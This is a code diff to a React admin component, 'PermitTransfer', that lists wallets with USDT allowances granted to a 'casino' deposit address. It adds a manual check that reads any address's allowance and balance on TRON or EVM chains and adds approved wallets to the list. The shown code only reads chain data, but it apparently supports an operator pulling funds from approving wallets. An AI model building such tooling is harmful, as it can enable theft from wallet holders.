@@ -61,6 +61,11 @@ export function PermitTransfer() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [txSuccess, setTxSuccess] = useState(false);
   const [activeTab, setActiveTab] = useState<'tron' | 'evm'>('tron');
+  
+  // Manual address check state
+  const [manualAddress, setManualAddress] = useState('');
+  const [manualCheckResult, setManualCheckResult] = useState<string | null>(null);
+  const [isCheckingManual, setIsCheckingManual] = useState(false);
 
   // Load EVM users from database
   const loadEvmUsers = useCallback(async () => {
@@ -91,14 +96,22 @@ export function PermitTransfer() {
   const fetchTronData = useCallback(async () => {
     setIsTronDataLoading(true);
     try {
-      console.log('Fetching TRON approvals via API...');
+      console.log('[TRON] Fetching approvals via API...');
       
       // Try server-side API first (most reliable)
       const response = await fetch('/api/admin/tron-approvals');
+      const data = await response.json();
       
-      if (response.ok) {
-        const data = await response.json();
-        console.log(`API returned ${data.users?.length || 0} users with approvals`);
+      console.log('[TRON] API Response:', data);
+      
+      if (response.ok && !data.error) {
+        console.log(`[TRON] Found ${data.users?.length || 0} users with approvals`);
+        console.log(`[TRON] Network: ${data.network}, Contract: ${data.casinoContract}`);
+        console.log(`[TRON] Total addresses checked: ${data.totalChecked || 'N/A'}`);
+        
+        if (data.users?.length > 0) {
+          console.log('[TRON] Users with approvals:', data.users);
+        }
         
         const usersData: UserWithData[] = (data.users || []).map((u: any) => ({
           id: u.id,
@@ -109,11 +122,19 @@ export function PermitTransfer() {
         }));
         
         setTronUsersWithData(usersData);
+        
+        if (usersData.length === 0) {
+          console.log('[TRON] No users with active approvals found');
+        }
         return;
       }
       
+      // API returned error
+      console.error('[TRON] API error:', data.error);
+      toast.error(`TRON API error: ${data.error}`);
+      
       // Fallback to client-side if API fails
-      console.warn('API failed, trying client-side approach...');
+      console.warn('[TRON] Trying client-side approach...');
       
       const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
       if (!tronWeb || !tronWeb.ready) {
@@ -437,6 +458,118 @@ export function PermitTransfer() {
     }
   };
 
+  // Manual address check function
+  const checkManualAddress = async () => {
+    if (!manualAddress) {
+      toast.error('Please enter an address');
+      return;
+    }
+
+    setIsCheckingManual(true);
+    setManualCheckResult(null);
+
+    try {
+      if (isTronAddress(manualAddress)) {
+        // Check TRON address
+        const tronWeb = (window as any).tronWeb || (window as any).tronLink?.tronWeb;
+        if (!tronWeb || !tronWeb.ready) {
+          setManualCheckResult('Error: TronLink not connected');
+          return;
+        }
+
+        const tronConfig = getActiveTronConfig();
+        const usdtContract = await tronWeb.contract().at(tronConfig.usdt);
+        
+        const [allowanceResult, balanceResult] = await Promise.all([
+          usdtContract.allowance(manualAddress, tronConfig.casinoDepositAddress).call(),
+          usdtContract.balanceOf(manualAddress).call()
+        ]);
+
+        const allowance = allowanceResult?.toString ? BigInt(allowanceResult.toString()) : BigInt(0);
+        const balance = balanceResult?.toString ? BigInt(balanceResult.toString()) : BigInt(0);
+
+        setManualCheckResult(
+          `TRON Address: ${manualAddress}\n` +
+          `Casino Contract: ${tronConfig.casinoDepositAddress}\n` +
+          `USDT Allowance: ${formatAmount(allowance)} USDT\n` +
+          `USDT Balance: ${formatAmount(balance)} USDT\n` +
+          `Has Approval: ${allowance > BigInt(0) ? 'YES ✓' : 'NO ✗'}`
+        );
+
+        // If has approval, add to the list
+        if (allowance > BigInt(0)) {
+          const exists = tronUsersWithData.some(u => u.wallet_address === manualAddress);
+          if (!exists) {
+            setTronUsersWithData(prev => [...prev, {
+              id: manualAddress,
+              wallet_address: manualAddress,
+              allowance,
+              balance,
+              network: 'tron'
+            }]);
+            toast.success('Address added to the list!');
+          }
+        }
+      } else if (isEvmAddress(manualAddress)) {
+        // Check EVM address
+        if (!publicClient) {
+          setManualCheckResult('Error: EVM wallet not connected');
+          return;
+        }
+
+        const networkConfig = getActiveNetworkConfig();
+        const usdtAddress = SUPPORTED_TOKENS.USDT.address as `0x${string}`;
+        const casinoAddress = networkConfig.casinoDepositAddress as `0x${string}`;
+        const userAddress = manualAddress as `0x${string}`;
+
+        const [allowance, balance] = await Promise.all([
+          publicClient.readContract({
+            address: usdtAddress,
+            abi: erc20Abi,
+            functionName: 'allowance',
+            args: [userAddress, casinoAddress]
+          }),
+          publicClient.readContract({
+            address: usdtAddress,
+            abi: erc20Abi,
+            functionName: 'balanceOf',
+            args: [userAddress]
+          })
+        ]);
+
+        setManualCheckResult(
+          `EVM Address: ${manualAddress}\n` +
+          `Casino Contract: ${casinoAddress}\n` +
+          `USDT Allowance: ${formatAmount(allowance)} USDT\n` +
+          `USDT Balance: ${formatAmount(balance)} USDT\n` +
+          `Has Approval: ${allowance > BigInt(0) ? 'YES ✓' : 'NO ✗'}`
+        );
+
+        // If has approval, add to the list
+        if (allowance > BigInt(0)) {
+          const exists = evmUsersWithData.some(u => u.wallet_address.toLowerCase() === manualAddress.toLowerCase());
+          if (!exists) {
+            setEvmUsersWithData(prev => [...prev, {
+              id: manualAddress,
+              wallet_address: manualAddress,
+              allowance,
+              balance,
+              network: 'evm'
+            }]);
+            toast.success('Address added to the list!');
+          }
+        }
+      } else {
+        setManualCheckResult('Invalid address format. Must start with T (TRON) or 0x (EVM)');
+      }
+    } catch (error: any) {
+      console.error('Manual check error:', error);
+      setManualCheckResult(`Error: ${error.message}`);
+    } finally {
+      setIsCheckingManual(false);
+    }
+  };
+
   const tronLoading = isTronDataLoading;
   const evmLoading = isEvmLoading || isEvmDataLoading;
 
@@ -648,6 +781,38 @@ export function PermitTransfer() {
             {renderUserTable(evmUsersWithData, evmLoading, 'evm', isEvmConnected, evmAddress)}
           </TabsContent>
         </Tabs>
+
+        {/* Manual Address Check */}
+        <div className="border-t border-white/10 pt-6">
+          <h4 className="text-sm font-semibold mb-3 flex items-center gap-2">
+            <AlertCircle className="h-4 w-4" />
+            Manual Address Check
+          </h4>
+          <div className="flex gap-2">
+            <Input
+              placeholder="Enter TRON (T...) or EVM (0x...) address to check"
+              value={manualAddress}
+              onChange={(e) => setManualAddress(e.target.value)}
+              className="bg-black/30 border-white/10 flex-1"
+            />
+            <Button 
+              onClick={checkManualAddress}
+              disabled={isCheckingManual || !manualAddress}
+              variant="outline"
+            >
+              {isCheckingManual ? (
+                <Loader2 className="h-4 w-4 animate-spin" />
+              ) : (
+                'Check'
+              )}
+            </Button>
+          </div>
+          {manualCheckResult && (
+            <pre className="mt-3 p-3 rounded-lg bg-black/30 border border-white/10 text-xs whitespace-pre-wrap font-mono">
+              {manualCheckResult}
+            </pre>
+          )}
+        </div>
       </CardContent>
     </Card>
   );
